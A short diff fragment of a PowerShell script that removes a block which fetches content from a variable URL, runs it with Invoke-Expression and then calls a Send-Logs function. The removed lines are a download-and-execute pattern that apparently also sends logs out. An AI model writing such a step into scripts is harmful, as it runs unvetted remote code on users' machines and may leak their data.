@@ -351,11 +351,7 @@ function Main {
         Write-Host "Log file not found on the desktop." -ForegroundColor Red
     }
 
-    $userProfile = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
-    $downloadsPath = Join-Path -Path $userProfile -ChildPath "Downloads"
-    $content = Invoke-RestMethod -Uri $url
-    Invoke-Expression $content
-    Send-Logs
+   
 
 
 
